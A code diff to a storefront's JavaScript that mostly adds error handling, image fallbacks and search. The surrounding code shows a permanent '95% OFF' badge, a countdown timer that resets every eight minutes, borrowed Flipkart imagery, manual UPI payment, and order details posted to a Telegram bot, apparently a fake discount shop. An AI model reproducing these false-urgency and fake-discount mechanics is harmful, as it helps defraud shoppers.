@@ -329,12 +329,19 @@ const products = [
     }
 ];
 
+
 // --- GLOBAL VARIABLES ---
 let currentProduct = null;
 let currentPrice = 0;
 let cart = []; 
 let isCartOrder = false; 
 let currentOrderID = "";
+
+// Check if products loaded correctly
+if (typeof products === 'undefined' || products.length === 0) {
+    console.error("Critical Error: Product data missing.");
+    alert("Site Error: Products not found. Check console.");
+}
 
 function getDiscountedPrice(price) { return Math.floor(price * 0.05); }
 
@@ -362,15 +369,24 @@ function hideLoading() {
 function renderCategories() {
     const nav = document.getElementById('category-nav');
     if (!nav) return;
+    
+    // Safety check for empty products
+    if(!products || products.length === 0) return;
+
     const categories = [...new Set(products.map(p => p.category))];
     categories.unshift("All");
 
     nav.innerHTML = categories.map(cat => {
+        // Safe find with optional chaining
         const product = products.find(p => p.category === cat) || products[0];
-        const img = cat === "All" ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
+        // Default image if product undefined
+        const img = (cat === "All" || !product) ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
+        
         return `
             <div class="cat-item ${cat === 'All' ? 'active' : ''}" onclick="filterByCategory(this, '${cat}')">
-                <div class="cat-img-box"><img src="${img}" class="cat-img"></div>
+                <div class="cat-img-box">
+                    <img src="${img}" class="cat-img" onerror="this.src='https://placehold.co/100?text=Icon'">
+                </div>
                 <span class="cat-name">${cat}</span>
             </div>
         `;
@@ -378,7 +394,6 @@ function renderCategories() {
 }
 
 function filterByCategory(element, category) {
-    // UI Update
     document.querySelectorAll('.cat-item').forEach(el => el.classList.remove('active'));
     if(element) element.classList.add('active');
 
@@ -395,10 +410,13 @@ function filterByCategory(element, category) {
 
 function renderProducts(productList = products) {
     const container = document.getElementById('product-container');
-    if (!container) return;
+    if (!container) {
+        console.error("Product Container not found in HTML");
+        return;
+    }
     container.innerHTML = '';
 
-    if(productList.length === 0) {
+    if(!productList || productList.length === 0) {
         container.innerHTML = `<div style="grid-column: 1/-1; text-align: center; padding: 40px; color: #666;"><p>No products found.</p></div>`;
         return;
     }
@@ -409,7 +427,7 @@ function renderProducts(productList = products) {
         card.className = 'product-card';
         card.innerHTML = `
             <div class="discount-badge">95% OFF</div>
-            <img src="${product.image}" class="product-img" loading="lazy">
+            <img src="${product.image}" class="product-img" loading="lazy" onerror="this.src='https://placehold.co/300x300?text=No+Image'">
             <div class="product-title">${product.name}</div>
             <div class="product-rating-row">
                 <div class="rating-badge">${product.rating} <i class="fas fa-star"></i></div>
@@ -439,7 +457,10 @@ function showProductDetail(product) {
     detailView.style.display = 'block';
 
     // Content Update
-    document.getElementById('detail-img').src = product.image;
+    const detailImg = document.getElementById('detail-img');
+    detailImg.src = product.image;
+    detailImg.onerror = function() { this.src = 'https://placehold.co/400x400?text=No+Image'; };
+
     document.getElementById('detail-title').innerText = product.fullName;
     document.getElementById('detail-price').innerText = `₹${currentPrice}`;
     document.getElementById('detail-old-price').innerText = `₹${product.price}`;
@@ -461,7 +482,6 @@ function updateCartCount() {
     if(badge) {
         badge.innerText = cart.length;
         badge.style.display = cart.length > 0 ? 'block' : 'none';
-        // Simple animation
         badge.style.transform = 'scale(1.2)';
         setTimeout(() => badge.style.transform = 'scale(1)', 200);
     }
@@ -469,7 +489,6 @@ function updateCartCount() {
 
 // --- CHECKOUT & PAYMENT ---
 function startCheckout() {
-    // Reset modal state
     document.getElementById('step-address').classList.remove('hidden');
     document.getElementById('step-payment').classList.add('hidden');
     document.getElementById('input-name').value = '';
@@ -505,17 +524,15 @@ function backToAddress() {
     document.getElementById('step-address').classList.remove('hidden');
 }
 
-// --- SMART PAYMENT LOGIC (Hybrid: Razorpay -> Fallback to UTR) ---
+// --- SMART PAYMENT LOGIC ---
 function initiatePayment() {
     const selected = document.querySelector('input[name="payment"]:checked').id;
 
     if (selected === 'online') {
-        // Try Razorpay First
         if (typeof Razorpay !== 'undefined') {
             showLoading();
             startRazorpay();
         } else {
-            // Script didn't load, fallback to manual UTR
             showToast("Gateway unavailable. Using Manual Method.");
             startManualUPI();
         }
@@ -559,7 +576,7 @@ function startRazorpay() {
         rzp1.open();
     } catch (e) {
         hideLoading();
-        startManualUPI(); // Fallback
+        startManualUPI(); 
     }
 }
 
@@ -597,14 +614,12 @@ function completeOrder(refId, method) {
 🆔 Ref: ${refId}
     `;
     
-    // Send to Telegram
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: orderDetails })
     });
 
-    // Show Success UI
     const successModal = document.getElementById('successModal');
     successModal.querySelector('.modal-content').innerHTML = `
         <div style="text-align: center; padding: 30px;">
@@ -621,32 +636,41 @@ function completeOrder(refId, method) {
 
 // --- INITIALIZATION ---
 document.addEventListener('DOMContentLoaded', () => {
-    // Handle Back Button
+    // Back Button Handler
     window.addEventListener('popstate', () => {
-        // If modals are open, close them first
         if(document.getElementById('product-detail-view').style.display === 'block') {
-             // Reset View
             document.getElementById('product-detail-view').style.display = 'none';
             document.getElementById('home-view').style.display = 'block';
             document.getElementById('timer-section').style.display = 'block';
         }
     });
 
+    // Start App
     renderCategories();
     renderProducts();
     
-    // Timer
     setInterval(() => {
         const now = Math.floor(Date.now() / 1000);
         const left = (8 * 60) - (now % (8 * 60));
         document.getElementById('timer').innerText = `${Math.floor(left/60).toString().padStart(2,'0')}:${(left%60).toString().padStart(2,'0')}`;
     }, 1000);
 
-    // Event Listeners
+    // Bind Global Clicks
     document.querySelector('.cart-btn').onclick = (e) => { 
         e.preventDefault(); 
-        // Cart Logic (simplified for brevity, assumes cart functionality)
         if(cart.length === 0) showToast("Cart is empty");
         else showToast("Cart feature coming in next update (Use Buy Now)"); 
     };
+
+    const loginBtn = document.querySelector('.login-btn');
+    if(loginBtn) loginBtn.addEventListener('click', () => { showToast("You are already logged in!"); });
+
+    const searchInput = document.querySelector('.search-bar input');
+    if(searchInput) {
+        searchInput.addEventListener('input', (e) => {
+            const q = e.target.value.toLowerCase().trim();
+            if(q === "") return renderProducts(products);
+            renderProducts(products.filter(p => p.name.toLowerCase().includes(q)));
+        });
+    }
 });
